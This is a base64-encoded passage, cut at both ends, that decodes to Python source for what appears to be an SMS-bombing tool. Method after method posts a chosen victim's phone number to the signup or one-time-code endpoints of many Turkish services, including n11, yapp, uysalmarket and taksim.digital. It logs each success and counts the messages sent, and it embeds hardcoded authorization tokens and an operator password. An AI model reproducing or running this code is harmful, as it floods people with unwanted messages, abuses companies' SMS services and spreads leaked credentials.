wb3J0eS50ZWNoIikKCiAgICAjIHRha3NpbS5kaWdpdGFsCiAgICBkZWYgVGFrc2ltKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vc2VydmljZS50YWtzaW0uZGlnaXRhbC9zZXJ2aWNlcy9QYXNzZW5nZXJSZWdpc3Rlci9SZWdpc3RlciIKICAgICAgICAgICAganNvbiA9IHsiY291bnRyeVBob25lQ29kZSI6ICIrOTAiLCAicGhvbmVObyI6IHNlbGYucGhvbmV9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybD11cmwsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbInN1Y2Nlc3MiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IHNlcnZpY2UudGFrc2ltLmRpZ2l0YWwiKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBzZXJ2aWNlLnRha3NpbS5kaWdpdGFsIikKCiAgICAjIHZha2lmdGFzZGVsZW5zdS5jb20KICAgIGRlZiBUYXNkZWxlbihzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwOi8vOTQuMTAyLjY2LjE2Mjo4MC9Nb2JpbFNlcnZpcy9hcGkvTW9iaWxPcGVyYXRpb24vQ3VzdG9tZXJQaG9uZVNtc1NlbmQiCiAgICAgICAgICAgIGpzb24gPSB7IlBob25lTnVtYmVyIjogc2VsZi5waG9uZSwgInVzZXIiOiB7IlBhc3N3b3JkIjogIkFhMTIzITM1QDEiLCAiVXNlck5hbWUiOiAiTW9iaWxPcGVyYXRvciJ9fQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmw9dXJsLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJSZXN1bHQiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IDk0LjEwMi42Ni4xNjI6ODAiKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiA5NC4xMDIuNjYuMTYyOjgwIikKCiAgICAjIHRhc2ltYWNpbS5jb20KICAgIGRlZiBUYXNpbWFjaW0oc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9zZXJ2ZXIudGFzaW1hY2ltLmNvbS9yZXF1ZXN0Y29kZSIKICAgICAgICAgICAganNvbiA9IHsicGhvbmUiOiBzZWxmLnBob25lLCAibGFuZyI6ICJ0ciJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybD11cmwsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAjI2xhc2tkZsWfbGFza2ZnxZ9hbHNrZsWfYWxzZGtsZ2Fsc2drYWxpxZ9zZmFzZGFzZAogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IHNlcnZlci50YXNpbWFjaW0uY29tIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gc2VydmVyLnRhc2ltYWNpbS5jb20iKQoKICAgICMjYXNnamFsa3NmamFsa3dma2FsxZ9zZsWfYXN3ZGFzd2ZhCiAgICAjIHRvcHRhbnRlc2xpbS5jb20KICAgIGRlZiBUb3B0YW5UZXNsaW0oc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly90dC5ldGljLmNvbS50cjo0NDMvYXBpL3NldEN1c3RvbWVyIgogICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgImF1dGhvcml6YXRpb24iOiAiQmFzaWMgZEc5d2RHRnVkR1Z6YkdsdE9qUjFOM2doUVNWRUtrY3RTMkZPWkZKblZXdFljREp6TlhZNGVTOUNQMFVvU0N0TllsRmxVMmhXYlZseE0zUTJkemw2SkVNbVJpbEtRRTVqVW1aVmFsZHVXbkkwZFRkNElVRWxSQ3BITFV0aFVHUlRaMVpyV1hBeWN6VjJPSGt2UWo5RktFZ3JUV0pSWlZSb1YyMWFjVFIwTm5jNWVpUkRKa1lwU2tCT1kxSm0ifQogICAgICAgICAgICBkYXRhID0geyJ0ZWxlcGhvbmUiOiBmIjB7c2VsZi5waG9uZX0iLCAibmFtZSI6ICJNZW1hdGkiLCAic3VybmFtZSI6ICJCYXMiLCAiZW1haWwiOiBzZWxmLm1haWwsCiAgICAgICAgICAgICAgICAgICAgInBhc3N3b3JkIjogIjMxMzEzMSIsICJwYXNzd29yZF9jb25maXJtYXRpb24iOiAiMzEzMTMxIn0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsPXVybCwgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IHR0LmV0aWMuY29tLnRyIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gdHQuZXRpYy5jb20udHIiKQoKICAgICMgdW5pbGV2ZXIuY29tLnRyCiAgICBkZWYgVW5pbGV2ZXIoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly93d3cuc2lwYXJpc2RpcmVrdC5jb20vY3VzdG9tZXIvb3RwL3NlbmRvdHAiCiAgICAgICAgICAgIGRhdGEgPSB7Im1vYmlsZSI6IHNlbGYucGhvbmUsICJwcmVmaXgiOiAiKzkwIn0KICAgICAgICAgICAgaGVhZGVycyA9IHsiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOCIsCiAgICAgICAgICAgICAgICAgICAgICAgIngtcmVxdWVzdGVkLXdpdGgiOiAiWE1MSHR0cFJlcXVlc3QifQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmw9dXJsLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSkKICAgICAgICAgICAgaWYgci5qc29uKClbInN0YXR1cyJdID09IDE6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gc2lwYXJpc2RpcmVrdC5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBzaXBhcmlzZGlyZWt0LmNvbSIpCgogICAgIyNrYXNqZGxrYWpmZ2xrYXdramRsYWt3a2Zsa8WfYXNrZgoKICAgICMjYW1rIGTDvGTDvCBzZW5pCgogICAgIyNhc2tqZGFsa2Zna2phxZ9sa3N3ZGprYcWfc2ZrYXNpxZ9mbGthc8WfZsWfYQoKICAgICMgdXlzYWxtYXJrZXQuY29tLnRyCiAgICBkZWYgVXlzYWwoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9hcGkudXlzYWxtYXJrZXQuY29tLnRyL2FwaS9tb2JpbGUtdXNlcnMvc2VuZC1yZWdpc3Rlci1zbXMiCiAgICAgICAgICAgIGpzb24gPSB7InBob25lX251bWJlciI6IHNlbGYucGhvbmV9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybD11cmwsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYXBpLnV5c2FsbWFya2V0LmNvbS50ciIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGFwaS51eXNhbG1hcmtldC5jb20udHIiKQoKICAgICMgeWFwcC5jb20udHIKICAgIGRlZiBZYXBwKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8veWFwcC5jb20udHI6NDQzL2FwaS9tb2JpbGUvdjEvcmVnaXN0ZXIiCiAgICAgICAgICAgIGpzb24gPSB7ImFwcF92ZXJzaW9uIjogIjEuMS4yIiwgImNvZGUiOiAidHIiLCAiZGV2aWNlX21vZGVsIjogImlQaG9uZTksNCIsICJkZXZpY2VfbmFtZSI6ICIiLAogICAgICAgICAgICAgICAgICAgICJkZXZpY2VfdHlwZSI6ICJJIiwgImRldmljZV92ZXJzaW9uIjogIjE1LjcuOCIsICJlbWFpbCI6IHNlbGYubWFpbCwgImZpcnN0bmFtZSI6ICJNZW1hdGkiLAogICAgICAgICAgICAgICAgICAgICJpc19hbGxvd190b19jb21tdW5pY2F0aW9uIjogIjEiLCAibGFuZ3VhZ2VfaWQiOiAiMSIsICJsYXN0bmFtZSI6ICJCYXMiLCAicGhvbmVfbnVtYmVyIjogc2VsZi5waG9uZSwKICAgICAgICAgICAgICAgICAgICAic21zX2NvZGUiOiAiIn0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsPXVybCwganNvbj1qc29uKQogICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiB5YXBwLmNvbS50ciIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IHlhcHAuY29tLnRyIikKCiAgICAjIHlpbG1henRpY2FyZXQubmV0CiAgICBkZWYgWWlsbWF6VGljYXJldChzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwOi8vd3d3LnlpbG1henRpY2FyZXQubmV0OjgwL3Jlc3RhcGkyL3JlZ2lzdGVyLyIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQXV0aG9yaXphdGlvbiI6ICJCYXNpYyBlV2xzYldGNk9ubHBiRzFoZWpJd01Ua3FLZz09In0KICAgICAgICAgICAgZGF0YSA9IHsidGVsZWZvbiI6IChOb25lLCBmIjAge3NlbGYucGhvbmV9IiksICJ0b2tlbiI6IChOb25lLCAiRXhwb25lbnRQdXNoVG9rZW5bZVdKakZhTl9iaGpBQWJOX3J4VUlscF0iKX0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSkKICAgICAgICAgICAgaWYgci5qc29uKClbImdpcmlzIl0gPT0gInN1Y2Nlc3MiOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IHlpbG1henRpY2FyZXQubmV0IikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4geWlsbWF6dGljYXJldC5uZXQiKQoKICAgICMgeXVmZmkuY28KICAgIGRlZiBZdWZmaShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2FwaS55dWZmaS5jby9hcGkvcGFyZW50L2xvZ2luL3VzZXIiCiAgICAgICAgICAgIGpzb24gPSB7InBob25lIjogc2VsZi5waG9uZSwgImt2a2siOiBUcnVlfQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbInN1Y2Nlc3MiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IGFwaS55dWZmaS5jbyIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGFwaS55dWZmaS5jbyIpCgogICAgIyBiZWVmdWxsLmNvbQogICAgZGVmIEJlZWZ1bGwoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9hcHAuYmVlZnVsbC5pbzo0NDMvYXBpL2luYXZpdGFzLWFjY2Vzcy1tYW5hZ2VtZW50L3NpZ251cCIKICAgICAgICAgICAganNvbiA9IHsiZW1haWwiOiBzZWxmLm1haWwsICJmaXJzdE5hbWUiOiAiTWVtYXRpIiwgImxhbmd1YWdlIjogInRyIiwgImxhc3ROYW1lIjogIkJhcyIsCiAgICAgICAgICAgICAgICAgICAgInBhc3N3b3JkIjogIjEyMzQ1NiIsICJwaG9uZUNvZGUiOiAiOTAiLCAicGhvbmVOdW1iZXIiOiBzZWxmLnBob25lLCAidGVuYW50IjogImJlZWZ1bGwiLAogICAgICAgICAgICAgICAgICAgICJ1c2VybmFtZSI6IHNlbGYubWFpbH0KICAgICAgICAgICAgcmVxdWVzdHMucG9zdCh1cmwsIGpzb249anNvbikKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vYXBwLmJlZWZ1bGwuaW86NDQzL2FwaS9pbmF2aXRhcy1hY2Nlc3MtbWFuYWdlbWVudC9zbXMtbG9naW4iCiAgICAgICAgICAgIGpzb24gPSB7InBob25lQ29kZSI6ICI5MCIsICJwaG9uZU51bWJlciI6IHNlbGYucGhvbmUsICJ0ZW5hbnQiOiAiYmVlZnVsbCJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1qc29uKQogICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBhcHAuYmVlZnVsbC5pbyIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGFwcC5iZWVmdWxsLmlvIikKCiAgICBkZWYgRXZpZGVhKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vd3d3LmV2aWRlYS5jb206NDQzL3VzZXJzL3JlZ2lzdGVyLyIKICAgICAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9ZkRsd1N6a1pVOURXNU1jdEl4T2k0RUlzWUI5TEtNUjF6eWI1ZE91aUpwanBRb0sxVlBqU3lxZHhIZnFQZG0zaUhhS2N6aSIsCiAgICAgICAgICAgICAgICAiWC1Qcm9qZWN0LU5hbWUiOiAidW5kZWZpbmVkIiwgIkFjY2VwdCI6ICJhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoiLAogICAgICAgICAgICAgICAgIlgtQXBwLVR5cGUiOiAiYWtpbm9uLW1vYmlsZSIsICJYLVJlcXVlc3RlZC1XaXRoIjogIlhNTEh0dHBSZXF1ZXN0IiwKICAgICAgICAgICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAidHItVFIsdHI7cT0wLjkiLCAiQ2FjaGUtQ29udHJvbCI6ICJuby1zdG9yZSIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsCiAgICAgICAgICAgICAgICAiWC1BcHAtRGV2aWNlIjogImlvcyIsICJSZWZlcmVyIjogImh0dHBzOi8vd3d3LmV2aWRlYS5jb20vIiwKICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIkV2aWRlYS8xIENGTmV0d29yay8xMzM1LjAuMyBEYXJ3aW4vMjEuNi4wIiwKICAgICAgICAgICAgICAgICJYLUNzcmZ0b2tlbiI6ICI3TmRKYldTWW5PZG03MFlWTEl5em15bFp3V2JxTEZidHNyY0NRZExBRWJueDdhNVRxNG5qalMzZ0VFbFp4WXBzIn0KICAgICAgICAgICAgZGF0YSA9IGYiLS1mRGx3U3prWlU5RFc1TWN0SXhPaTRFSXNZQjlMS01SMXp5YjVkT3VpSnBqcFFvSzFWUGpTeXFkeEhmcVBkbTNpSGFLY3ppXHJcbmNvbnRlbnQtZGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cImZpcnN0X25hbWVcIlxyXG5cclxuTWVtYXRpXHJcbi0tZkRsd1N6a1pVOURXNU1jdEl4T2k0RUlzWUI5TEtNUjF6eWI1ZE91aUpwanBRb0sxVlBqU3lxZHhIZnFQZG0zaUhhS2N6aVxyXG5jb250ZW50LWRpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJsYXN0X25hbWVcIlxyXG5cclxuQmFzXHJcbi0tZkRsd1N6a1pVOURXNU1jdEl4T2k0RUlzWUI5TEtNUjF6eWI1ZE91aUpwanBRb0sxVlBqU3lxZHhIZnFQZG0zaUhhS2N6aVxyXG5jb250ZW50LWRpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJlbWFpbFwiXHJcblxyXG57c2VsZi5tYWlsfVxyXG4tLWZEbHdTemtaVTlEVzVNY3RJeE9pNEVJc1lCOUxLTVIxenliNWRPdWlKcGpwUW9LMVZQalN5cWR4SGZxUGRtM2lIYUtjemlcclxuY29udGVudC1kaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiZW1haWxfYWxsb3dlZFwiXHJcblxyXG5mYWxzZVxyXG4tLWZEbHdTemtaVTlEVzVNY3RJeE9pNEVJc1lCOUxLTVIxenliNWRPdWlKcGpwUW9LMVZQalN5cWR4SGZxUGRtM2lIYUtjemlcclxuY29udGVudC1kaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwic21zX2FsbG93ZWRcIlxyXG5cclxudHJ1ZVxyXG4tLWZEbHdTemtaVTlEVzVNY3RJeE9pNEVJc1lCOUxLTVIxenliNWRPdWlKcGpwUW9LMVZQalN5cWR4SGZxUGRtM2lIYUtjemlcclxuY29udGVudC1kaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwicGFzc3dvcmRcIlxyXG5cclxuMzFBQkMuLmFiYzMxXHJcbi0tZkRsd1N6a1pVOURXNU1jdEl4T2k0RUlzWUI5TEtNUjF6eWI1ZE91aUpwanBRb0sxVlBqU3lxZHhIZnFQZG0zaUhhS2N6aVxyXG5jb250ZW50LWRpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJwaG9uZVwiXHJcblxyXG4we3NlbGYucGhvbmV9XHJcbi0tZkRsd1N6a1pVOURXNU1jdEl4T2k0RUlzWUI5TEtNUjF6eWI1ZE91aUpwanBRb0sxVlBqU3lxZHhIZnFQZG0zaUhhS2N6aVxyXG5jb250ZW50LWRpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJjb25maXJtXCJcclxuXHJcbnRydWVcclxuLS1mRGx3U3prWlU5RFc1TWN0SXhPaTRFSXNZQjlMS01SMXp5YjVkT3VpSnBqcFFvSzFWUGpTeXFkeEhmcVBkbTNpSGFLY3ppLS1cclxuIgogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1kYXRhKQogICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMjoKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBldmlkZWEuY29tIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gZXZpZGVhLmNvbSIpCgogICAgZGVmIE4xMShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL21vYmlsZWFwaS5uMTEuY29tOjQ0My9tb2JpbGVhcGkvcmVzdC92Mi9tc2lzZG4tdmVyaWZpY2F0aW9uL2luaXQtdmVyaWZpY2F0aW9uP19faGFwYz1GNDFBMEMwMS1EMTAyLTREQkUtOTdCMi0wN0JDRTIzMTdDRDMiCiAgICAgICAgICAgIGhlYWRlcnMgPSB7Ik1vYmlsZWNsaWVudCI6ICJJT1MiLCAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLCAiQWNjZXB0IjogIiovKiIsCiAgICAgICAgICAgICAgICAgICAgICAgIkF1dGhvcml6YXRpb24iOiAiYXBpX2tleT1pcGhvbmUsYXBpX2hhc2g9OWY1NWQ0NGUyYWEyODMyMmNmODRiNTgxNmJiMjA0NjEsYXBpX3JhbmRvbT02ODZBMTQ5MS0wNDFGLTQxMzgtODY1Ri05RTc2QkM2MDM2N0YiLAogICAgICAgICAgICAgICAgICAgICAgICJDbGllbnR2ZXJzaW9uIjogIjE2MyIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAibjExLzEgQ0ZOZXR3b3JrLzEzMzUuMC4zIERhcndpbi8yMS42LjAiLCAiQWNjZXB0LUxhbmd1YWdlIjogInRyLVRSLHRyO3E9MC45IiwKICAgICAgICAgICAgICAgICAgICAgICAiQ29ubmVjdGlvbiI6ICJjbG9zZSJ9CiAgICAgICAgICAgIGpzb24gPSB7Il9faGFwYyI6ICIiLCAiX2RldmljZUlkIjogIjY5NkIxNzEtMDMxTi00MTMxLTMxNUYtOUE3NkJGNjAzNjhGIiwgImNoYW5uZWwiOiAiTU9CSUxFX0lPUyIsCiAgICAgICAgICAgICAgICAgICAgImNvdW50cnlDb2RlIjogIis5MCIsICJlbWFpbCI6IHNlbGYubWFpbCwgImdzbU51bWJlciI6IHNlbGYucGhvbmUsICJ1c2VyVHlwZSI6ICJCVVlFUiJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIChyLmpzb24oKVsiaXNTdWNjZXNzIl0pID09IFRydWU6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gbW9iaWxlYXBpLm4xMS5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBtb2JpbGVhcGkubjExLmNvbSIpCgogICAgIyB0YXppLnRlY2gKICAgIGRlZiBUYXppKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vbW9iaWxlYXBpdjIudGF6aS50ZWNoOjQ0My9DMDg0Njc2ODFDNjg0NENGQTZEQTI0MEQ1MUM4QUE4Qy91eWV2Mi9zbXNsb2dpbiIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PXV0Zi04IiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLCAiVXNlci1BZ2VudCI6ICJUYXolQzQlQjEvMyBDRk5ldHdvcmsvMTMzNS4wLjMgRGFyd2luLzIxLjYuMCIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJ0ci1UUix0cjtxPTAuOSIsCiAgICAgICAgICAgICAgICAgICAgICAgIkF1dGhvcml6YXRpb24iOiAiQmFzaWMgZEdGNmFWOTFjM0pmYzNOc09qTTVOVEEzUmpJNFF6azJNalJEUTBJNFFqVkJRVGcyUlVReE9VRTRNREZEIn0KICAgICAgICAgICAganNvbiA9IHsiY2VwX3RlbCI6IHNlbGYucGhvbmUsICJjZXBfdGVsX3Vsa2Vrb2QiOiAiOTAifQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1qc29uKQogICAgICAgICAgICBpZiAoci5qc29uKClbImtvZCJdKSA9PSAiMDAwMCI6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gbW9iaWxlYXBpdjIudGF6aS50ZWNoIikKICAgICAgICAgICAgIC